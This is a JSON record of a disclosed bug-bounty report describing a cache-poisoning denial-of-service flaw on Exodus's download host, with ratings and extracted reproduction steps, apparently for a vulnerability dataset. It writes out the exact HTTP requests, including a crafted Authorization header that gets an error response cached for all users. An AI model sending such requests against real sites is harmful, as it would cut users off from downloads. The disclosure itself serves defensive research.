@@ -1,0 +1,38 @@
+{
+    "reported_to": "Exodus",
+    "reported_by": "youstin ",
+    "title": "Cache Poisoning DoS on downloads.exodus.com",
+    "content": "\nSummary:\nHello,\nThe subdomain downloads.exodus.com hosts all files meant to be downloaded by exodus users. A few of the file I found are:\nCode 192 Bytes\n1https://downloads.exodus.com/releases/exodus-linux-x64-21.4.9.zip\n2https://downloads.exodus.com/releases/hashes-exodus-21.2.12.txt\n3https://downloads.exodus.com/releases/exodus-macos-21.3.29.dmg\nThe files are hosted on a azure storage host and are cached by Cloudflare.\nA crafted Authorization header causes a 403 on the azure storage host, which is cached by cloudflare and passed to all other users accessing the source.\nDisclaimer:\nNo actual denial of service attack was caused troughout my testing. All the testing used cache-busters, meaning it did not affect the live website in any way.\nSteps To Reproduce:\nSend the following request to poison the cache:\nCode 184 Bytes\n1GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1\n2Host: downloads.exodus.com\n3Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=  \n4\nNotice you will get a 403.\nThe cache is now poisoned so sending a request without the header or visiting the poisoned url in a browser will show you the cached 403.\nCode 106 Bytes\n1```http\n2GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1\n3Host: downloads.exodus.com\n4\nWill show the same 403 response.\nSupporting Material/References:\nVideo PoC:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nThe steps that were used to take down a reosurce including a random parameter as a cache-buster can also be reproduced on the actual files when their cache is about to expire. This will cause a DoS, restricting users from downloading or accessing the files hosted on downloads.exodus.com.\n\n",
+    "severity": [
+        7.5,
+        null
+    ],
+    "bounty": 1000,
+    "weaknesses": [
+        "Uncontrolled Resource Consumption"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1640234160,
+    "report_url": "https://hackerone.com/reports/1173153",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Send a crafted request with an Authorization header to poison the cache: GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1 Host: downloads.exodus.com Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08="
+        ],
+        [
+            2,
+            "Verify the cache is poisoned by sending a request without the Authorization header: GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1 Host: downloads.exodus.com"
+        ]
+    ],
+    "vuln_description": "A crafted Authorization header causes a 403 on the Azure storage host, which is cached by Cloudflare and passed to all other users accessing the resource, leading to a denial of service.",
+    "reason": "The attack involves understanding how Cloudflare caching interacts with Azure storage and how crafted headers can trigger cacheable error responses. While the components (Cloudflare, Azure, headers) are common, the interaction leading to cache poisoning is non-obvious.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
